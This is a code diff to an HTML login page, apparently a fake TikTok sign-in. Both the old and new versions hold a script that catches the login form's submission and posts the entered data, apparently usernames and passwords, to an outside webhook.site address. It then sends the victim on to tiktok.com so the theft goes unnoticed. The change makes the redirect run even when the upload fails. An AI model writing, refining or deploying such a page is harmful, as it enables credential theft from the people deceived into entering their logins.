@@ -60,18 +60,18 @@
             <button type="submit">Log in</button>
         </form>
     </div>
-
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const formData = new FormData(this);
-            fetch('https://webhook.site/15e6e8ec-5d5a-473e-aaf8-1cc442a195c9', {
-                method: 'POST',
-                body: formData
-            }).then(() => {
-                window.location.href = "https://www.tiktok.com";
-            });
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const formData = new FormData(this);
+        
+        fetch('https://webhook.site/15e6e8ec-5d5a-473e-aaf8-1cc442a195c9', {
+            method: 'POST',
+            body: formData
+        }).finally(() => {
+            window.location.href = "https://www.tiktok.com/";
         });
-    </script>
+    });
+</script>
 </body>
 </html>
